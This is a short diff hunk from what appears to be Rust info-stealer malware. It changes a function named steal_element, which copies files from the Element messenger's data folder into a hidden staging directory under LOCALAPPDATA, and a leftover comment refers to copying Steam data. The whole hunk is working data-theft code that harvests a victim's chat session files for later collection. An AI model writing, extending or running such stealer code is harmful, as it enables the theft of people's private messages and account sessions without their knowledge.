@@ -9,13 +9,13 @@ pub fn steal_element() {
         return;
     }
 
-    std::fs::create_dir(format!("{}\\logsxc\\Element\\", std::env::var("LOCALAPPDATA").unwrap())).unwrap();
+    std::fs::create_dir(format!("{}\\logscx\\Element\\", std::env::var("LOCALAPPDATA").unwrap())).unwrap();
 
     
 
     for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
            
-       let _ =  std::fs::copy(entry.path(), &format!("{}\\logsxc\\Element\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())); // Copy Steam shit
+       let _ =  std::fs::copy(entry.path(), &format!("{}\\logscx\\Element\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())); // Copy Steam shit
     }
 
 
